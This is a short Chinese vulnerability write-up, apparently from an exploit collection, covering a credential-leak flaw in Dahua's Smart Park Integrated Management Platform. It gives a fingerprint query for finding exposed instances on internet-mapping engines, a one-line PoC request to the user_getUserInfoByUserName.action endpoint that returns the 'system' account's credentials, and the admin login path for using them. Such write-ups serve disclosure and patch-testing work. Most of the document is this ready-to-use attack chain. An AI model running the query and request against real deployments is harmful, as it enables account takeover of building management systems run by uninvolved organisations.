# 大华 智慧园区综合管理平台 user\_getUserInfoByUserName.action 账号密码泄漏漏洞

## 漏洞描述

大华 智慧园区综合管理平台 user\_getUserInfoByUserName.action 中存在API接口，导致管理园账号密码泄漏

## 漏洞影响

智慧园区综合管理平台

## 网络测绘

```
app="dahua-智慧园区综合管理平台"
```

## 漏洞复现

![image-20230828144644472](../.gitbook/assets/image-20230828144644472.png)

请求POC

```
/admin/user_getUserInfoByUserName.action?userName=system
```

![image-20230828144658624](../.gitbook/assets/image-20230828144658624.png)

获取后访问地址

```
/admin/login_login.action
```

![image-20230828144732646](../.gitbook/assets/image-20230828144732646.png)
